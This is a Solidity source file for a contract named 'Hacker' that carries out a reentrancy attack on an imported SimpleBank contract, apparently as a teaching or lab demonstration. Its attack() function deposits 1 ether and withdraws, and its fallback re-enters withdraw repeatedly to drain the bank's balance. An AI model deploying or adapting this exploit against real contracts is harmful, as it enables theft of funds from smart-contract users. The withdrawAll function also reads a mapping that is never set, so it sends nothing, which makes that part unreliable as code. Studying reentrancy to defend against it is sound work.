// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SimpleBank.sol";


contract Hacker {
    
    SimpleBank public simpleBank;

    mapping(address => uint256) public balances;

    constructor(address _simpleBankAdrress) {
        simpleBank = SimpleBank(_simpleBankAdrress);
    }

    fallback() external payable {
        if (address(simpleBank).balance >= 1 ether) {
            simpleBank.withdraw(1);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        simpleBank.deposit{value: 1 ether}();
        simpleBank.withdraw(1);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    
    function withdrawAll() public returns (uint256 remainingBal) {
        
        uint256 bal  = balances[address(this)];

        (bool sent,) = msg.sender.call{value: bal}("");

        require(sent, "Failed to send Ether");
        
        return balances[msg.sender];
    }

}